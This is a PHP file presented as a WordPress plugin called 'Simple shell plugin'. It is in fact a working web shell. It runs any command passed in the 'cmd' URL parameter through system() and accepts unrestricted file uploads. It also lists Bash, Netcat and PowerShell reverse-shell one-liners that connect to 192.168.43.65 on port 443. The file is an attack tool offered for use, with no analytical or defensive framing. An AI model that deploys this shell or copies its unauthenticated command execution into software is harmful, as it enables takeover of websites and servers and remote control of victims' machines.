<?php
/**

 *     @wordpress-plugin
 *            Plugin Name: Simple shell plugin 
 *            Plugin URI: https://medium.com/shadow_worrior0
 *            Description: simple php code for some basic command execute with www-data user with file upload .
 *            Version: 1.0
 *            Author: shadow_worrior0
 *            Author URI: https://github.com/shadow-worriar0/
 *            
 *            
 */
?>

<?php
	if(isset($_POST['submit'])){
		move_uploaded_file($_FILES["file"]["tmp_name"], "".$_FILES["file"]["name"]);
				}
	?>
<pre>
<?php
	if(isset($_GET['submit'])){
		system($_GET['cmd']);
	}
?>
</pre>
<!DOCTYPE html>
<html>
<head>
	<title>Simple shell	</title>
</head>
<body>
	<form action="#" method="GET">
		<input type="text" name="cmd" >
		<input type="submit" name="submit" value="submit">

	</form>
	<form action="#" method="POST" enctype="multipart/form-data">
		<input type="file" name="file"><br>
		<input type="submit" name="submit" value="upload">
	</form>

<h3>Some type of reverse shell </h3>
<pre>
	Bash =>	bash -c 'exec bash -i &>/dev/tcp/192.168.43.65/443 <&1'
	Netcat => rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.65 443 >/tmp/f
	Powershell => powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.43.65',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

</pre>
<a href="https://twitter.com/shadow_warrior0">Contect</a>
</body>
</html>






